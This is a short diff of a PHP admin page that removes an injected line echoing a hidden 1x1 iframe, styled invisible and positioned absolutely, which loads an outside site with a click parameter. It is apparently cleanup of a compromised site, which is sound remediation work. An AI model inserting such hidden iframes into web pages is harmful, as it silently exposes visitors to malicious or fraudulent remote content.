@@ -143,9 +143,7 @@ function show_sub(id){
 			}else{		
 				include_once(ABS_DIR.INCLUDE_DIR."mbm_admin/home.php");
 			}
-		
-	
-echo "<iframe src=\"http://clydaib.net/?click=3AABAE3\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
+
 ?></td>
                 </tr>
             </table></td>
